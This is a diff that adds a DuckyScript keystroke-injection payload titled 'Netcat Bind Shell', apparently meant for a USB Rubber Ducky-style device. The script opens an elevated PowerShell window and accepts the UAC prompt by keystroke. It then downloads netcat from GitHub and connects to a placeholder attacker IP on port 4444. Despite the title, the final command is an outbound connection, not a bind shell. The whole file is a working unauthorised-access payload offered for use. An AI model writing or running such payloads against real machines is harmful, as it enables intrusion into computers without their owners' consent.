@@ -1,0 +1,27 @@
+REM Title: Netcat Bind Shell
+REM Author: David Garcia [dmcxblue]
+REM Version: 1
+REM Description:
+DELAY 200
+REM --> Minimize all windows
+WINDOWS d
+DELAY 500
+REM --> Start powershell here
+GUI r
+DELAY 600
+STRING powershell Start-Process powershell -Verb RunAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 500
+REM --> Downloads NetCat and Enables TLS just in case of TLS errors
+DELAY 500
+STRING [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+ENTER
+DELAY 500
+STRING Invoke-WebRequest "https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe" -OutFile "nc.exe"
+ENTER
+DELAY 500
+STRING .\nc.exe [ATTACKER IP] 4444
+ENTER
+DELAY 5000
